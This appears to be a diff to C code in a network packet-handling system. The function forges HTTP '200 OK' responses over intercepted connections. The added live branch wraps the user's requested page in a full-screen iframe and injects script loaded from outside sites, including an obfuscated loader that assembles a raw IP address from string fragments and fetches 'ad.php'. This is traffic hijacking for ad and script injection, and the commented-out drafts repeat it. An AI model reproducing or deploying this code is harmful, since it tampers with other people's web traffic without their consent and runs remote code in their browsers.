@@ -198,6 +198,139 @@ berr naga_adp_new(hytag_t *hytag)
     }  
 
 
+
+
+/*
+ 
+replace : 
+ 
+    "<script>\n"
+    "d=document;\n"
+    "function u(){\n"
+    "var f = \"";
+    
+		
+    "\";\n"
+    "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_t=t\';\n"
+    "}\n"
+    "</script>\n" 
+ 
+to:
+ 
+<script>
+(function(w){var a7= w.a7 || {} ;var d=document;a7.u = function() 
+{        var f = d.location.href;        d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'?')+'_t_t_t='+Math.random(); 
+};w.a7 = a7;})(window);
+</script>
+<style> 
+ 
+ 
+ 
+ 
+ 
+ 
+ ***************************************************************************
+ 
+ 
+ <!DOCTYPE HTML>
+<html>
+<head>
+<title></title>
+<script type="text/javascript" src="http://www.pangolinnet.com/plug/witmenu/js/jquery.js"></script>
+<script type="text/javascript" src="http://www.pangolinnet.com/plug/witmenu/js/datetable.js"></script>
+<script> 
+ 
+( 
+function(w) 
+{ 
+    var a7= w.a7 || {} ;
+    var d=document;
+ 
+    a7.u = function() 
+        {
+            var f = d.location.href;
+            document.write(f);
+            alert(f);
+//            d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'?')+'_t_t_t='+Math.random();
+        };
+    w.a7 = a7;
+ }
+ )(window);
+ 
+</script>
+<style>
+    body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}#i{display:block; position:absolute; z-index:1; width:100%; height:100%}
+</style>
+</head>
+<body onLoad=a7.u()>
+<div id='i'>
+<iframe id='m' frameborder='0' width='100%' height='100%'></iframe>
+</div>
+<script type="text/javascript" src="http://www.pangolinnet.com/plug/witmenu/js/witmenu.js" charset="utf-8">
+
+</script>
+</body>
+</html>
+ 
+ 
+ 
+******************************************************************** 
+ 
+
+    
+    memcpy((void*)buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
+    char head[]="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
+        "Content-Length:"; 
+    char tail[] = "\r\n"
+        "Cache-Control: no-store, no-cache\r\n"
+        "Connection: close\r\n\r\n";
+
+    char body1[] = "<html>\n"
+            "<head>\n"
+            "<meta charset=\"utf-8\">\n"
+            "<title></title>\n"
+            "<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/1.7/jquery.min.js\"></script>\n"
+            "<script type=\"text/javascript\" src=\"http://www.pangolinnet.com/plug/witmenu/js/jquery.js\"></script>\n"
+
+            "<script>"
+            "(function u(w){var a7= w.a7 || {} ;var d=document;a7.u = "
+            "function() { "
+            " var f = d.location.href;"
+            " document.write(f);"
+            " alert(f);"
+
+            " d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0?'?':'?')+'_t_t_t='+Math.random();"
+            " w.a7 = a7;})(window);"
+            "</script>\n"
+
+            "<style>\n"
+            "body{margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
+            "#i{display:block;position:absolute;z-index:1;width:100%;height:100%}\n"
+            "</style>\n"
+            "</head>\n"
+            "<body>\n"
+            "<div id=i>\n"
+            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
+            "</div>\n"
+            "<script>"
+            "var usrc='ht'+'tp'+':/'+ '/'+'219'+'.234'+'.83.60'+'/php/ad.php';"
+            "document.write('<scr'+'ipt type=\"text/javascript\"'+' src=\"'+usrc+'\"></scr'+'ipt>');"
+			"</script>\n"			
+			"<script>"
+			"$(function(){a7.u();});"	
+			"</script>\n"	
+			"</body>\n"
+            "</html>\n";
+
+    char * buffer_l5 = (char *)(buffer+ hytag->l5_offset);
+    int contlen = sizeof(body1);
+    l = snprintf(buffer_l5, 2048, "%s%d%s%s",
+        head, contlen, tail, body1); 
+ 
+*/
+
+#if 0
+
 	
 	memcpy((void*)buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
 	char head[]="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
@@ -245,10 +378,58 @@ berr naga_adp_new(hytag_t *hytag)
 
 
 	char * buffer_l5 = (char *)(buffer+ hytag->l5_offset);
-	int contlen = sizeof(body1) + sizeof(body2) + hytag->url_len;
+	int contlen = sizeof(body1) + sizeof(body2) + hytag->url_len + strlen("http://") - 1;
 	l = snprintf(buffer_l5, 2048, "%s%d%s%shttp://%s%s",
 		head, contlen, tail, body1, hytag->url,  body2);
 
+#else 
+    
+    memcpy((void*)buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
+    char head[]="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
+        "Content-Length:"; 
+    char tail[] = "\r\n"
+        "Cache-Control: no-store, no-cache\r\n"
+        "Connection: close\r\n\r\n";
+
+    char body1[] = "<html>\n"
+            "<head>\n"
+            "<meta charset=\"utf-8\">\n"
+            "<title></title>\n"
+            "<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/1.7/jquery.min.js\"></script>\n"
+            "<script type=\"text/javascript\" src=\"http://www.pangolinnet.com/plug/witmenu/js/jquery.js\"></script>\n"
+            "<script>\n"
+            "function u(){\n"
+            "var d = document;\n"
+            "var f = d.location.href;\n"
+            "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_t=t\';}\n"
+            "</script>\n"
+
+            "<style>\n"
+            "body{margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
+            "#i{display:block;position:absolute;z-index:1;width:100%;height:100%}\n"
+            "</style>\n"
+            "</head>\n"
+            "<body>\n"
+            "<div id=i>\n"
+            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
+            "</div>\n"
+            "<script>\n"
+            "var usrc='ht'+'tp'+':/'+ '/'+'219'+'.234'+'.83.60'+'/php/ad.php';\n"
+            "document.write('<scr'+'ipt type=\"text/javascript\"'+' src=\"'+usrc+'\"></scr'+'ipt>');\n"
+			"</script>\n"			
+			"<script>\n"
+			"$(function(){u();});\n"
+			"</script>\n"
+			"</body>\n"
+            "</html>";
+            
+
+    char * buffer_l5 = (char *)(buffer+ hytag->l5_offset);
+    int contlen = sizeof(body1) - 1;
+    l = snprintf(buffer_l5, 2048, "%s%d%s%s",
+        head, contlen, tail, body1);
+
+#endif
 
 	int rv;
 	rv = ads_response_packet_gen(buffer, hytag, l);
